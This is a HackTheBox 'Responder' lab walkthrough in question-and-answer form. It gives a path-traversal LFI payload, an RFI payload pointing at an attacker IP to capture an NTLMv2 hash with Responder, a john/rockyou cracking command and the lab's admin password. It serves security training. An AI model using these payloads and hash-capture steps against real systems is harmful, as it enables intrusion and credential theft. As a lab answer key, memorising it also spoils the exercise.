<h1>Responder</h1>

<h2>CONNECT</h2>
Connect to Starting Point VPN before starting the machine<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Fawn/Fawn/download.png" alt="download" width="30%">
Using <code>openvpn</code> to operate the file of <code>download vpn</code> in kali.

<h2>TASK</h2>

<h3>TASK 1</h3>
Q：When visiting the web service using the IP address, what is the domain that we are being redirected to?<br>
A：<code>unika.htb</code><br><br>
Enter <code>Target IP</code> on the webpage, you can find that the web site is automatically directed to <code>unika.htb</code>.<br>
It is worth noting that we <code>can not connect</code> to the server at unika.htb.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/unikia.htb.png" alt="unikia.htb" width="60%">
To fix the problem, we need to add <code>target ip</code> and <code>domain name</code> in the <a href="https://man7.org/linux/man-pages/man5/hosts.5.html">/etc/hosts</a> as shown below.

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/hosts.png" alt="hosts" width="40%">
After finishing configuring <code>/etc/hosts</code>, refresh the website and you should see the correct page.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/unikapage.png" alt="unikapage" width="60%">

<h3>TASK 2</h3>
Q：Which scripting language is being used on the server to generate webpages?<br>
A：<code>php</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/PHP.png" alt="PHP" width="30%">

<h3>TASK 3</h3>
Q：What is the name of the URL parameter which is used to load different language versions of the webpage?
<br>
A：<code>page</code><br><br>

Click <code>EN</code> in the upper right corner of the screen to switch languages.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/language.png" alt="language" width="60%">

After switching to <code>FR</code> (French), you can find that there is an additional parameter <code>page=french.html</code> in the URL.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/language2.png" alt="language2" width="60%">

<h3>TASK 4</h3>
Q：Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability:<br>
"french.html",<br>
"//10.10.14.6/somefile",<br>
"../../../../../../../../windows/system32/drivers/etc/hosts",<br>
"minikatz.exe"<br>
A：<code>../../../../../../../../windows/system32/drivers/etc/hosts</code><br><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/LFI.png" alt="LFI" width="60%">

<h3>TASK 5</h3>
Q：Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability:<br>
"french.html",<br> 
"//10.10.14.6/somefile",<br>
"../../../../../../../../windows/system32/drivers/etc/hosts",<br>
"minikatz.exe"<br>
A：<code>//10.10.14.6/somefile</code>

<h3>TASK 6</h3>
Q：What does NTLM stand for?<br>
A：<code>New Technology LAN Manager</code>

<h3>TASK 7</h3>
Q：Which flag do we use in the Responder utility to specify the network interface?<br>
A：<code>-I</code><br><br>
Use <code>responder -h</code> to see the option.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/responder.png" alt="responder" width="60%">

<h3>TASK 8</h3>
Q：There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?<br>
A：<code>john the ripper</code><br><br>
<a href="https://www.itperfection.com/computer-network-concepts/what-is-john-the-ripper-and-how-does-it-work-password-checker-brute-force-dictionary-attack/">What is John the Ripper and How Does it Work?</a>

<h3>TASK 9</h3>
Q：What is the password for the administrator user?<br>
A：<code>badminton</code><br><br>
Since we do not know the password of administrator, we need to use <code>responder</code> command to get the <code>hash value</code> and then brute force it.
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/tun0.png" alt="tun0" width="60%">
Copy the <code>Responder IP</code> in Generic Options, paste it <code>behind</code> the <code>page parameter</code>, and you can freely enter text behind the Responder IP.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/resdetail.png" alt="resdetail" width="60%">
(Here I have entered the same <code>/somefile</code> at the end of URL as TASK 5)<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/RFI.png" alt="RFI" width="60%">
After exploiting a <code>RFI</code> vulnerability, we can <code>responder</code> get a <code>NTLMv2-SSP Hash</code>.
In order to bruce force <code>NTLMv2-SSP Hash</code>, save the hash value to the .txt file.<br>
(Here I save the hash value as hash.txt)<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/hashvalue.png" alt="hashvalue" width="60%">
<code>Rockyou.txt</code> is a common password list that we need to know first.
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/wordlist.png" alt="wordlist" width="60%">
We can get the <code>password</code> of administrator by using <code>john --wordlist=/usr/share/wordlists/rockyou.txy hash.txt</code> command.
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Responder/Responder/john.png" alt="john" width="60%">
<h3>TASK 10</h3>
Q：We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?<br>
A：<code>5985</code>


<h2>SUBMIT FLAG</h2>

